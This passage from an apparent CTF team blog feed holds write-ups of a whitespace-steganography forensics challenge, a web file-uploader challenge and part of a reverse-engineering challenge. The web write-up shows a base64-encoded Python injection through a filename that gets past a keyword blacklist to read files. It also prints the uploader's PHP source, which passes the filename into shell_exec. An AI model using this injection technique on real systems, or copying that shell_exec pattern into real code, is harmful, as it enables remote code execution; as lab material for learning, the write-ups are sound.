    <content type="html"><![CDATA[<blockquote><br>Winter Sport<br>996<br><br>======= Difficulty level : Easy ========<br><br>I have a friend named Jake.We were watching a football tournament on one fine chilly morning. Meanwhile Jake’s sister Susan did something mischievous which cause Jake to lose some really important data. We could only find this piece of evidence, can you recover it for him?<br><br>========== Authors : cr4ck3t, stuxn3t ==========<br><br></blockquote><p>In this challenge, it is provided a zip file containing a pdf <em>file.pdf</em> where it is possible to find the following message.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/vP1vAOp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vP1vAOp.png" alt=""><br></a></p><p>Besides this clear message, after running <strong>binwalk</strong>, we can find that there is another 7z archive. </p><p><a data-fancybox="gallery" href="https://i.imgur.com/tkshXno.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tkshXno.png" alt=""><br></a></p><p>After extracting this 7z archive it is revealed another pdf, <em>omg.pdf</em>, containing the following characters,</p><p><a data-fancybox="gallery" href="https://i.imgur.com/f8jgvem.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/f8jgvem.png" alt=""><br></a></p><p>Well at first by opening the pdf in a text editor, we saw the composition of the pdf <em>/ProcSet [/PDF /Text /ImageB /ImageC]</em>, saying that it contains 2 images although the pdf seemed to be corrupted, since we tried to extract the images from this pdf and there were some errors (some <em>endstreams</em> were missing and some other stuff regarding the pdf structure file). After we found what it seemed to be the encoding for those characters from the image above and they would translate into <strong>“What is Steganography ?Steganography is an amaz”</strong> but nothing more than that.<br>Since we couldn’t find a clear way, we were going to fix the pdf anatomically speaking, and then we saw this.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IDgXOj1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IDgXOj1.png" alt=""><br></a></p><p>Well a bunch os spaces and tabs, just on the first 13 lines of the pdf? Due to Sublime Text (where tabs -&gt; “-“ and spaces -&gt; “.”) the idea of being another <strong>morse code</strong> related challenge, but well how could we find the spaces? what if we were using other text editor? Other options that came to our mind was <strong><a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language" target="_blank" rel="noopener">Whitespace</a>)</strong> and due to the message “What is Steganography ?Steganography is an amaz” we searched for steganography whitespace and we found <strong><a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html" target="_blank" rel="noopener">Stegsnow</a></strong> which “is a program for concealing messages in text files by appending tabs  and  spaces on  the  end  of lines, and <strong>for extracting messages from files containing hidden messages</strong>“. That was exactly what we wanted. Running it on the given <em>omg.pdf</em> it gave us the flag.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KAuVS6i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KAuVS6i.png" alt=""><br></a></p><p><strong>Flag: </strong> inctf{w3lcom3_t0_7h3_w0rld_0f_whit3sp4c3}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Winter Sport&lt;br&gt;996&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;I have a friend named Jake.We were watching a foo
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="steganography" scheme="https://teamrocketist.github.io/tags/steganography/"/>
    
      <category term="whitespace_steganography" scheme="https://teamrocketist.github.io/tags/whitespace-steganography/"/>
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
  </entry>
  
  <entry>
    <title>[Web] InCTF 2018 - The Most Secure File Uploader</title>
    <link href="https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/"/>
    <id>https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/</id>
    <published>2018-10-08T00:09:56.000Z</published>
    <updated>2018-10-24T23:21:04.842Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The Most Secure File Uploader<br>100<br><br>======= Difficulty level : Medium ========<br><br>Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)<br><br>link<br><br>========== Authors : c3rb3ru5, Nimisha, SpyD3r ==========<br><br></blockquote><p>After a long pause we are happy to announce that we are doing CTFs again so more write ups coming soon this month :). </p><p>Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special:<br><a data-fancybox="gallery" href="https://i.imgur.com/SIdVAKj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/SIdVAKj.png" alt=""><br></a></p><p>And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that a lot of words were blacklisted:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklisted = <span class="string">r"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span></span><br></pre></td></tr></table></figure><p>As we know blacklisting is always a bad practice after testing for a while I noticed that <strong><em>globals()</em></strong> wasn’t being blocked and from globals we can easily can get the builtin function from python :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print globals()"</span></span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-in)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: None, <span class="string">'__package__'</span>: None&#125;</span><br><span class="line">$ python -c <span class="string">"print globals().values()[0]"</span></span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-in)&gt;</span><br><span class="line">$ python -c <span class="string">"print dir(globals().values()[0])"</span></span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure><p>But we run into a problem now a lot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory <img src="https://www.tutorialspoint.com/python/os_listdir.htm" alt="os.listdir">, the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (<strong>dict</strong>[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of encoding in my case I choose to use base64:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print globals().values()[0].__dict__['__import__']('os')"</span> <span class="comment"># gets caught by the filter</span></span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))"</span> <span class="comment">#bypasses the filter</span></span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure><p>Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like <strong><em>.jpg</em></strong>, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg"</span> </span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure><p>Now if we want to list the current directory with <strong><em>os.listdir(‘.’)</em></strong> we just need to complete our script:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/af3eq5s.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/af3eq5s.png" alt=""><br></a></p><p>We now know that there is a file with the name of flag we just need to read it with open and read() :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'open'</span>](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></span><br><span class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'b3Blbg=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/9DHTSlo.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9DHTSlo.png" alt=""><br></a></p><p>And there it was the flag, and I managed to get the source code of the php file so here is an extra:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">$blacklist = <span class="string">"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"PLEASE UPLOAD SOMETHING"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"&lt;br--&gt;"</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType &amp;&amp; <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></span><br><span class="line">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Filename: "</span>.$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"I think its called blacklisting...!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The file: "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Size: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $name = urldecode($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"python -c \""</span> . $name . <span class="string">"\" 2&gt;&amp;1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;The Most Secure File Uploader&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Medium ========&lt;br&gt;&lt;br&gt;Somehow the codes are all mess
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pyjail" scheme="https://teamrocketist.github.io/tags/pyjail/"/>
    
      <category term="python_sandbox" scheme="https://teamrocketist.github.io/tags/python-sandbox/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 34C3ctf - m0rph</title>
    <link href="https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/"/>
    <id>https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/</id>
    <published>2017-12-30T00:07:22.000Z</published>
    <updated>2018-10-24T23:21:04.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>m0rph 49 Solves: 163<br><br>To get you started :)<br><br>files: Link<br><br>difficulty: easy<br><br></blockquote><p>Opening the binary in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/PsNIOT8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/PsNIOT8.png" alt=""><br></a></p><p>As we can see <strong><code>mmap</code></strong> is being used to reserve a place in memory with <strong>read,write and execute permissions</strong>, by knowing this we can expect that some <strong>shellcode</strong> is going to be inserted in some place in the memory and then executed. The <strong>shellcode</strong> is being inserted in the final for loop that you can see in the image above, but in each run, this <strong>mini shellcodes</strong> are going to be executed in a different order because they are being randomized in <strong>sub_55C4675D7987</strong>. This isn’t a problem we can use <strong>radare2</strong> to check this shellcode on each loop iteration, by reading the <strong>shellcode</strong> we can check which byte is being checked in <strong>cmp</strong> instructions.</p><p>The commands I used in radare2 to this were the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ood argv1 <span class="comment"># starts the binary with argv1</span></span><br><span class="line">pdf @ main <span class="comment"># disassembles the main function</span></span><br><span class="line">db <span class="comment"># setting breakpoints</span></span><br><span class="line">dc <span class="comment"># continue</span></span><br><span class="line">pd <span class="number">4</span>@rax <span class="comment"># to disassemble the first 4 instructions before call rax</span></span><br><span class="line">dr <span class="comment"># show register values</span></span><br><span class="line">dr rax <span class="comment"># show a specific value of a register in this case rax</span></span><br><span class="line">dr rax = <span class="number">0x1</span> <span class="comment"># modifies the value of rax in this case to 0x1</span></span><br></pre></td></tr></table></figure><p>Since <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener">pie protection</a> is <strong>enabled</strong>  the addresses to breakpoint will be different in each debug running attempt, to circumvent this in my python script I’m disassembling the <strong>main function</strong> and parsing the code to get this addresses. Since we don’t know the flag yet on each <strong>byte checks</strong> we can’t forget to update in the <strong>argv1</strong> string the correct bytes otherwise (before <strong>cmp</strong>), if the check goes <strong>incorrect</strong> the shellcode will call <strong>syscall_exit</strong> and terminates.</p><p>My radare2 script to do this (<a href="https://github.com/radare/radare2-r2pipe" target="_blank" rel="noopener">r2pipe</a>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_lowest_byte</span><span class="params">(n, b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> n &amp; <span class="number">0xffffffffffffff00</span> | b</span><br><span class="line"></span><br><span class="line">flag_begin = <span class="string">'34C3_'</span></span><br><span class="line">flag = flag_begin + <span class="string">'A'</span>*(<span class="number">23</span>-len(flag_begin))</span><br><span class="line"></span><br><span class="line">r2=r2pipe.open(<span class="string">'./morph'</span>,flags=[<span class="string">'-2'</span>])</span><br><span class="line">r2.cmd(<span class="string">"ood %s"</span> % flag)</span><br><span class="line">r2.cmd(<span class="string">"aa"</span>)</span><br><span class="line">source_main = r2.cmd(<span class="string">"pdf @ main"</span>)</span><br><span class="line">bp_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> source_main.split(<span class="string">'\n'</span>) <span class="keyword">if</span> <span class="string">"call rax"</span> <span class="keyword">in</span> line]</span><br><span class="line">bps = [re.search(<span class="string">r'0x[0-9a-f]+'</span>, bp).group(<span class="number">0</span>) <span class="keyword">for</span> bp <span class="keyword">in</span> bp_lines]</span><br><span class="line"><span class="keyword">for</span> bp <span class="keyword">in</span> bps:</span><br><span class="line">r2.cmd(<span class="string">'db %s'</span>%bp)</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):</span><br><span class="line">code = r2.cmd(<span class="string">"pd 4@rax"</span>)</span><br><span class="line">line = code.split(<span class="string">'\n'</span>)[<span class="number">-1</span>]</span><br><span class="line">finds = re.findall(<span class="string">r'0x[0-9a-f]+'</span>, line)</span><br><span class="line">cmp_b = finds[<span class="number">0</span>]</span><br><span class="line">flag_byte = finds[<span class="number">1</span>]</span><br><span class="line">t = (int(flag_byte,<span class="number">16</span>), int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>))</span><br><span class="line">flag_bytes.append(t)</span><br><span class="line">r2.cmd(<span class="string">"db %s"</span> % cmp_b)</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">address = int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>)</span><br><span class="line">r2.cmd(<span class="string">"dr rax = %s"</span> % hex(write_lowest_byte(address, int(flag_byte,<span class="number">16</span>))))</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_bytes = sorted(flag_bytes,key=<span class="keyword">lambda</span> tup: tup[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(t[<span class="number">0</span>]) <span class="keyword">for</span> t <span class="keyword">in</span> flag_bytes])</span><br><span class="line">r2.quit()</span><br></pre></td></tr></table></figure><p>If you putted a breakpoint before the end, you could check the full shellcode with radare2 by using this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 